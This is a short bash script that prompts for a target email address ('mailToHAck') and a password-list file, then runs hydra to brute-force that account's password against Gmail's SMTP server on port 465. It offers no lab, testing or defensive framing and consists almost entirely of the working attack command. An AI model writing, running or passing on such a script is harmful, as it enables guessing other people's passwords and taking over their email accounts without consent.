#!/bin/bash
echo the error which u will be set in those entering value will not be handled
echo 'so,	be careful'
read
read -p 'mailToHAck: ' mail00
read -p 'path to pwd list: ' path00
hydra -S -l "$mail00" -P "$path00" -e ns -V -t 1 -w 5 -s 465 smtp.gmail.com smtp
